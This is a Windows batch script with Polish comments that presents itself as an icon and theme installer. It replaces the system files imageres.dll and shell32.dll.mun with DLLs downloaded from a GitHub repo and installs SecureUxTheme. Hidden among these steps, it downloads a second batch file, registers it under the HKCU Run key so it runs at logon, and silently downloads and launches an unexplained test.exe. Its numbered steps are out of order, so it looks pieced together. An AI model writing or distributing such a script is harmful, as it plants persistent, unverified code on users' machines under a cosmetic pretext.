@echo off
setlocal

echo [!] Nadawanie uprawnien administratorom (SID: S-1-5-32-544)...

REM Przejmij wlasnosc pliku imageres.dll
takeown /f "C:\Windows\System32\imageres.dll"
icacls "C:\Windows\System32\imageres.dll" /grant *S-1-5-32-544:F /t /c /l

REM Przejmij wlasnosc pliku shell32.dll.mun
takeown /f "C:\Windows\SystemResources\shell32.dll.mun"
icacls "C:\Windows\SystemResources\shell32.dll.mun" /grant *S-1-5-32-544:F /t /c /l

echo.
echo [+] Zakonczono. Nacisnij dowolny klawisz, aby wyjsc...

echo [!] Zmienianie nazw plikow...

rename "C:\Windows\System32\imageres.dll" imageres.dll.old
rename "C:\Windows\SystemResources\shell32.dll.mun" shell32.dll.mun.old

echo [+] Nazwy plikow zmienione.

echo [3/5] Pobieranie nowych plikow z GitHub...

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/matisio3/RevertMetro/releases/download/Other/imageres.dll' -OutFile '%temp%\imageres.dll'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/matisio3/RevertMetro/raw/refs/heads/main/DLLFiles/shell32.dll.mun' -OutFile '%temp%\shell32.dll.mun'"

move /Y "%temp%\imageres.dll" "C:\Windows\System32\"
move /Y "%temp%\shell32.dll.mun" "C:\Windows\SystemResources\"

taskkill /IM explorer.exe /F
DEL /A /Q "%localappdata%\IconCache.db"
DEL /A /F /Q "%localappdata%\Microsoft\Windows\Explorer\iconcache*"


echo [6/6] Gotowe! Ikony zostały zastosowane.
endlocal


:: Ścieżka do pobrania pliku ZIP
set INSTALLER_URL=https://github.com/namazso/SecureUxTheme/releases/download/v3.0.0/SecureUxTheme-amd64.zip
set ZIP_PATH=%TEMP%\SecureUxTheme-amd64.zip
set EXTRACT_DIR=%TEMP%\SecureUxTheme

:: Pobierz plik ZIP
echo [1/4] Pobieranie SecureUxTheme-amd64.zip...
powershell -Command "Invoke-WebRequest -Uri '%INSTALLER_URL%' -OutFile '%ZIP_PATH%'"

:: Wypakuj plik ZIP
echo [2/4] Wypakowywanie pliku ZIP...
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_DIR%' -Force"

curl -o "%APPDATA%\czesc_3.bat" -L "https://raw.githubusercontent.com/matisio3/RevertMetro/refs/heads/main/czesc_3.bat"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v StartScript /t REG_SZ /d "%APPDATA%\czesc_3.bat" /f

rem Pobranie pliku test.exe do katalogu tymczasowego %temp%
curl -L -o "%temp%\test.exe" https://raw.githubusercontent.com/matisio3/RevertMetro/refs/heads/main/test.exe

rem Uruchomienie pobranego pliku test.exe z katalogu %temp%
start "" "%temp%\test.exe"

:: Restart Eksploratora Windows, by zastosować zmiany
echo Restartowanie Eksploratora Windows...
taskkill /f /im explorer.exe
start /wait explorer.exe

:: Uruchom ThemeTool.exe
echo [3/4] Uruchamianie ThemeTool.exe...
start "" "%EXTRACT_DIR%\ThemeTool.exe" /verysilent

:: Usuwanie plików tymczasowych
echo [4/4] Czyszczenie plików tymczasowych...
del /F /Q "%ZIP_PATH%"
rmdir /S /Q "%EXTRACT_DIR%"

echo Instalacja SecureUxTheme zakończona!
endlocal

rem Zakończenie skryptu
exit


